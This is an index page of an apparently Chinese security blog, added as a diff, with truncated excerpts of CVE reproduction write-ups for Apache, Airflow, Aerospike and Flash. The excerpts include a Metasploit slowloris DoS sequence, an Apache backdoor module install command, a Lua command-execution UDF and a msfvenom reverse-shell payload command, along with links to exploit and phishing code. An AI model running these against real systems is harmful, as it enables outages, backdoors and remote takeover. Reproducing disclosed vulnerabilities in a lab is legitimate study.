@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/98/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-Apache Axis/（CVE-2019-0227）Apache Axis 1.4远程代码执行" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apache%20Axis/%EF%BC%88CVE-2019-0227%EF%BC%89Apache%20Axis%201.4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="article-date">
+  <time datetime="2022-07-08T06:25:52.158Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-0227）Apache-Axis-1-4远程代码执行"><a href="#（CVE-2019-0227）Apache-Axis-1-4远程代码执行" class="headerlink" title="（CVE-2019-0227）Apache Axis 1.4远程代码执行"></a>（CVE-2019-0227）Apache Axis 1.4远程代码执行</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Apache<br>Axis™是一个简单对象访问协议（SOAP）引擎。在最近的一次红队行动中，我们发现目标装有老版本的Apache<br>Axis（1.4）。现在较新的有Apache Axis2, Apache CXF,和Metro等。尽管Apache<br>Axis已经过时，但它仍然在许多情况下被使用，例如使用Axis构造的项目难以重写或者项目中含有使用SOAP编码的服务。</p>
+<p>我们的目标仍在使用过时的版本，因此我们觉得值得深入挖掘，看看是否有可利用的漏洞。最后，我们找到了一个RCE漏洞，该漏洞是由于在默认的示例中使用了过期的硬编码域名作为默认安装。Apache官方为该漏洞签署编号：CVE-2019-0227。现在，我们已经购买了过期域名（<a target="_blank" rel="noopener" href="http://www.xmltoday.com)从而防止该漏洞被恶意利用.在本文中,我们将在本地环境中(无需域名)为你演示这个漏洞,同时这个漏洞对axis2也有影响./">www.xmltoday.com）从而防止该漏洞被恶意利用。在本文中，我们将在本地环境中（无需域名）为你演示这个漏洞，同时这个漏洞对Axis2也有影响。</a></p>
+<p>Axis如果你在服务器的Apache<br>Axis或Axis2的找到服务端请求伪造（SSRF）漏洞，你也可能实现目标服务器的代码执行。在Ambionics<br>Security的博客文章中有类似的介绍。因为涉及到产权保护，我不会介绍那篇文章的太多细节，总而言之：Axis以管理员权限处理localhost的请求，攻击者可以通过SSRF漏洞修改HTTP<br>GET请求部分来伪装成localhost用户。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache Axis版本= 1.4</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/cve-2019-0227">https://github.com/ianxtianxt/cve-2019-0227</a></p>
+<h3 id="1、需要在msf设置监听，另外需要修改代码24-30行处"><a href="#1、需要在msf设置监听，另外需要修改代码24-30行处" class="headerlink" title="1、需要在msf设置监听，另外需要修改代码24-30行处"></a>1、需要在msf设置监听，另外需要修改代码24-30行处</h3>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Apache%20Axis/%EF%BC%88CVE-2019-0227%EF%BC%89Apache%20Axis%201.4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20Axis/%EF%BC%88CVE-2019-0227%EF%BC%89Apache%20Axis%201.4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" data-id="cl5c2qlqp0017y8v115t6grna" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Apache Airflow/（CVE-2020-11978）Apache Airflow 命令注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apache%20Airflow/%EF%BC%88CVE-2020-11978%EF%BC%89Apache%20Airflow%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:52.128Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-11978）Apache-Airflow-命令注入漏洞"><a href="#（CVE-2020-11978）Apache-Airflow-命令注入漏洞" class="headerlink" title="（CVE-2020-11978）Apache Airflow 命令注入漏洞"></a>（CVE-2020-11978）Apache Airflow 命令注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>默认情况下Airflow Web<br>UI是未授权访问的，直接可以登录，而登录后，只能查看DAG的调度状态等，无法进行更多操作。但Airflow Web<br>UI中提供了触发DAG运行的功能，以便测试DAG，同时Airflow为了让使用者可以快速熟悉其DAG开发流程和功能，为了更好的示例这些DAG覆盖了大多的执行器。而其中两个DAG组合起来可触发命令注入导致漏洞产生。</p>
+<p><strong>要在WEB UI中先执行下启用DAG，然后才可以执行运行，如下所示</strong></p>
+<p><img src="/resource/(CVE-2020-11978)ApacheAirflow%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId22.png" alt="2.png"></p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache Airflow &lt; 1.10.11</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先看下下面两个DAG</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Apache%20Airflow/%EF%BC%88CVE-2020-11978%EF%BC%89Apache%20Airflow%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20Airflow/%EF%BC%88CVE-2020-11978%EF%BC%89Apache%20Airflow%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qltz0019y8v1dx157msj" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Apache Airflow/（CVE-2019-0216）Apache Airflow 储存型xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apache%20Airflow/%EF%BC%88CVE-2019-0216%EF%BC%89Apache%20Airflow%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" class="article-date">
+  <time datetime="2022-07-08T06:25:52.126Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-0216）Apache-Airflow-储存型xss"><a href="#（CVE-2019-0216）Apache-Airflow-储存型xss" class="headerlink" title="（CVE-2019-0216）Apache Airflow 储存型xss"></a>（CVE-2019-0216）Apache Airflow 储存型xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Apache Airflow 1.10.2及之前版本中的airflow<br>webserver服务存在跨站脚本漏洞，该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache Airflow &lt; 1.10.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>访问<code>/admin/dagrun/</code>（默认是不需要密码）</p>
+<p>创建一个项目</p>
+<p>1.png</p>
+<p>返回列表，可以看到点击”运行”可以让你输入HTML代码</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Apache%20Airflow/%EF%BC%88CVE-2019-0216%EF%BC%89Apache%20Airflow%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20Airflow/%EF%BC%88CVE-2019-0216%EF%BC%89Apache%20Airflow%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" data-id="cl5c2qlty0018y8v13s491cj4" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Apache/（CVE-2019-0211）Apache HTTP 服务组件提权漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apache/%EF%BC%88CVE-2019-0211%EF%BC%89Apache%20HTTP%20%E6%9C%8D%E5%8A%A1%E7%BB%84%E4%BB%B6%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:52.057Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-0211）Apache-HTTP-服务组件提权漏洞"><a href="#（CVE-2019-0211）Apache-HTTP-服务组件提权漏洞" class="headerlink" title="（CVE-2019-0211）Apache HTTP 服务组件提权漏洞"></a>（CVE-2019-0211）Apache HTTP 服务组件提权漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>在Apache HTTP Server 2.4发行版2.4.17到2.4.38中，无论是使用Apache HTTP<br>Server 的MPM<br>event模式、还是worker或prefork模式，在低权限的子进程或线程中执行的代码(包括由进程内脚本解释器执行的脚本)可以通过操纵记分牌（scoreboard）来执行具有父进程(通常是Root进程)权限的任意代码。非unix系统则不受影响。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache HTTP Server 2.4.17-2.4.38</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>1.恶意用户首先修改bucket,并使其指向恶意构造的prefork_child_bucket结构（共享内存中）。</p>
+<p>2.优雅重启</p>
+<p>主服务进程会杀死以前所有的工作进程，然后调用prefork_run，fork出新的工作进程</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Apache/%EF%BC%88CVE-2019-0211%EF%BC%89Apache%20HTTP%20%E6%9C%8D%E5%8A%A1%E7%BB%84%E4%BB%B6%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Apache/%EF%BC%88CVE-2019-0211%EF%BC%89Apache%20HTTP%20%E6%9C%8D%E5%8A%A1%E7%BB%84%E4%BB%B6%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qlnu0015y8v17jeb1oi0" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Apache/（CVE-2017-15715）Apache解析漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apache/%EF%BC%88CVE-2017-15715%EF%BC%89Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:52.055Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2017-15715）Apache解析漏洞"><a href="#（CVE-2017-15715）Apache解析漏洞" class="headerlink" title="（CVE-2017-15715）Apache解析漏洞"></a>（CVE-2017-15715）Apache解析漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache 2.4.0到2.4.29</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>首先正常上传一个图片，发现无法上传</p>
+<p><img src="/resource/(CVE-2017-15715)Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<p>如果文件名取自$_FILES[&#39;file&#39;][&#39;name&#39;]，就会自动把换行符去掉，而文件名取自post参数name中，就能很好的利用到这个解析漏洞</p>
+<p>下面我们上传一个包含换行符的文件，这里需要注意只能时\x0a而不是\x0d\x0a，\x0d\x0a的情况是我们直接添加一个换行符，我们利用burp的hex功能在test666.php后面添加一个\x0a</p>
+<p><img src="/resource/(CVE-2017-15715)Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Apache/%EF%BC%88CVE-2017-15715%EF%BC%89Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Apache/%EF%BC%88CVE-2017-15715%EF%BC%89Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qlne0014y8v1aues98j4" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Apache/（CVE-2007-6750）Apache ddos" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apache/%EF%BC%88CVE-2007-6750%EF%BC%89Apache%20ddos/" class="article-date">
+  <time datetime="2022-07-08T06:25:52.051Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2007-6750）Apache-ddos"><a href="#（CVE-2007-6750）Apache-ddos" class="headerlink" title="（CVE-2007-6750）Apache ddos"></a>（CVE-2007-6750）Apache ddos</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Apache<br>HTTP服务器1.x和2.x允许远程攻击者通过部分HTTP请求导致拒绝服务(守护进程中断)，如Slowloris所示，这与2.2.15之前版本中缺少mod_ReqTimeout模块有关</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache 1.x/2.x</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>nmap -sV -p80<br>192.168.146.175(用nmap查看Apache版本)(Apache2.2.3初步断定存在漏洞)<img src="/resource/(CVE-2007-6750)Apacheddos/media/rId24.png"></p>
+<p>接着访问网站查看是否正常(发现网站正常)<img src="/resource/(CVE-2007-6750)Apacheddos/media/rId25.png"></p>
+<pre><code>msfconsole(启动metasploit)
+
+use auxiliary/dos/http/slowloris(使用模块)
+
+set RHOST 192.168.146.175(设置目标IP)
+
+run(执行攻击)
+</code></pre>
+<p><img src="/resource/(CVE-2007-6750)Apacheddos/media/rId26.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Apache/%EF%BC%88CVE-2007-6750%EF%BC%89Apache%20ddos/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Apache/%EF%BC%88CVE-2007-6750%EF%BC%89Apache%20ddos/" data-id="cl5c2qlne0013y8v12hnt4ckl" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Apache/Apache后门维持" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apache/Apache%E5%90%8E%E9%97%A8%E7%BB%B4%E6%8C%81/" class="article-date">
+  <time datetime="2022-07-08T06:25:52.048Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Apache后门维持"><a href="#Apache后门维持" class="headerlink" title="Apache后门维持"></a>Apache后门维持</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>通过运行第三方脚本，实现维持后门的方法</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/apache-">https://github.com/ianxtianxt/apache-</a></p>
+<h3 id="1、上传-mod-backdoor-c到服务器，并执行命令"><a href="#1、上传-mod-backdoor-c到服务器，并执行命令" class="headerlink" title="1、上传 mod_backdoor.c到服务器，并执行命令"></a>1、上传 mod_backdoor.c到服务器，并执行命令</h3><pre><code>apxs -i -a -c mod_backdoor.c &amp;&amp; service apache2 restart
+</code></pre>
+<p><img src="/resource/Apache%E5%90%8E%E9%97%A8%E7%BB%B4%E6%8C%81/media/rId25.jpg"></p>
+<h3 id="2、控制端执行方法"><a href="#2、控制端执行方法" class="headerlink" title="2、控制端执行方法"></a>2、控制端执行方法</h3>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Apache/Apache%E5%90%8E%E9%97%A8%E7%BB%B4%E6%8C%81/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Apache/Apache%E5%90%8E%E9%97%A8%E7%BB%B4%E6%8C%81/" data-id="cl5c2qlnd0012y8v1138mbwi7" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Aerospike/（CVE-2020-13151）Aerospike 数据库主机命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Aerospike/%EF%BC%88CVE-2020-13151%EF%BC%89Aerospike%20%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%BB%E6%9C%BA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:52.041Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-13151）Aerospike-数据库主机命令执行漏洞"><a href="#（CVE-2020-13151）Aerospike-数据库主机命令执行漏洞" class="headerlink" title="（CVE-2020-13151）Aerospike 数据库主机命令执行漏洞"></a>（CVE-2020-13151）Aerospike 数据库主机命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>攻击者借助特制的UDF利用该漏洞以当前用户权限在该集群的所有节点上执行任意的操作系统命令。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Aerospike 社区版 &lt;5.1.0.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>首先导入<code>CVE-2020-13151.lua</code></p>
+<pre><code>function runCMD(rec, cmd)
+    local outtext = &quot;&quot;
+    local phandle = io.popen(cmd)
+    io.input(phandle)
+    local foo = io.lines()
+    for f in foo do
+        outtext = outtext .. f .. &quot;\n&quot;
+    end
+    return outtext
+end
+</code></pre>
+<p>3.png</p>
+<p>创建单记录测试数据集以进行以下操作：</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Aerospike/%EF%BC%88CVE-2020-13151%EF%BC%89Aerospike%20%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%BB%E6%9C%BA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Aerospike/%EF%BC%88CVE-2020-13151%EF%BC%89Aerospike%20%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%BB%E6%9C%BA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qlm60011y8v19wu03qkl" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Adobe Flash Player/（CVE-2018-4878）Adobe Flash Player 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Adobe%20Flash%20Player/%EF%BC%88CVE-2018-4878%EF%BC%89Adobe%20Flash%20Player%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:51.979Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-4878）Adobe-Flash-Player-远程代码执行漏洞"><a href="#（CVE-2018-4878）Adobe-Flash-Player-远程代码执行漏洞" class="headerlink" title="（CVE-2018-4878）Adobe Flash Player 远程代码执行漏洞"></a>（CVE-2018-4878）Adobe Flash Player 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>2018年1月31日，韩国CERT发布公告称发现Flash<br>0day漏洞的野外利用，攻击者执行针对性的攻击；2月1日Adobe发布安全公告，确认Adobe<br>Flash Player 28.0.0.137<br>及早期版本存在远程代码执行漏洞（CVE-2018-4878）；2月2日，Cisco<br>Talos团队发布了事件涉及攻击样本的简要分析；2月7日，Adobe发布了CVE-2018-4878漏洞的安全补丁。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Adobe Flash Player &lt;= 28.0.0.137</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><ul>
+<li>  1.环境    kail: <code>192.168.184.128</code>    win7sp1: <code>192.168.184.131</code>    exp: <code>CVE-2018-4878-master.zip </code>    flash: <code>AdobeFlashPlayer28.0.0.161正式版.zip</code></li>
+<li>  2.利用msfvenom生成对应的shellcode代码</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.184.128 lport=4444 -f python&gt;shellcode.txt
+</code></pre>
+<p><img src="/resource/(CVE-2018-4878)AdobeFlashPlayer%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Adobe%20Flash%20Player/%EF%BC%88CVE-2018-4878%EF%BC%89Adobe%20Flash%20Player%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Adobe%20Flash%20Player/%EF%BC%88CVE-2018-4878%EF%BC%89Adobe%20Flash%20Player%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qllh0010y8v1h70lgkih" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Adobe Flash Player/Flash钓鱼源码" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Adobe%20Flash%20Player/Flash%E9%92%93%E9%B1%BC%E6%BA%90%E7%A0%81/" class="article-date">
+  <time datetime="2022-07-08T06:25:51.977Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Flash-钓鱼源码"><a href="#Flash-钓鱼源码" class="headerlink" title="Flash 钓鱼源码"></a>Flash 钓鱼源码</h1><p><a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/Flash-player">https://github.com/ianxtianxt/Flash-player</a></p>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Adobe%20Flash%20Player/Flash%E9%92%93%E9%B1%BC%E6%BA%90%E7%A0%81/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Adobe%20Flash%20Player/Flash%E9%92%93%E9%B1%BC%E6%BA%90%E7%A0%81/" data-id="cl5c2qllh000zy8v1dvyh39js" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/97/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/96/">96</a><a class="page-number" href="/page/97/">97</a><span class="page-number current">98</span><a class="page-number" href="/page/99/">99</a><a class="page-number" href="/page/100/">100</a><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/99/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
